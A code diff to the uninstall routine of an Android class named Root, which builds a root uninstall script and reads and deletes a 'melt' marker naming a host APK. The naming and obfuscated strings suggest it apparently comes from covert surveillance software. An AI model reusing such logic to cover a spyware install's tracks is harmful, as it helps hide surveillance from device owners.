@@ -19,6 +19,7 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.Execute;
 import com.android.dvci.util.ExecuteResult;
 import com.android.dvci.util.PackageUtils;
+import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
@@ -403,9 +404,28 @@ public class Root {
 			script += M.e("pm uninstall ") + packageName + "\n";
 
 			String meltapk = "";
-			AutoFile markupMelt = new AutoFile(String.format("/data/data/%s/files/mm", packageName));
-			if(markupMelt.exists()) {
-				meltapk = new String(markupMelt.read());
+
+			Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
+			if(markupMelt.isMarkup()){
+				meltapk = markupMelt.unserialize(new String());
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (uninstallRoot), uninstall markupMelt: " + meltapk);
+				}
+			}
+
+			if(StringUtils.isEmpty(meltapk)) {
+				AutoFile markupFileMelt = new AutoFile(String.format("/data/data/%s/mm", packageName));
+				if (markupFileMelt.exists()) {
+					byte[] content = markupFileMelt.read();
+					if (content != null) {
+						meltapk = new String(content);
+					}
+					markupFileMelt.delete();
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (uninstallRoot), uninstall markupFileMelt: " + meltapk);
+					}
+				}
 			}
 
 			if(meltapk.length() > 0){
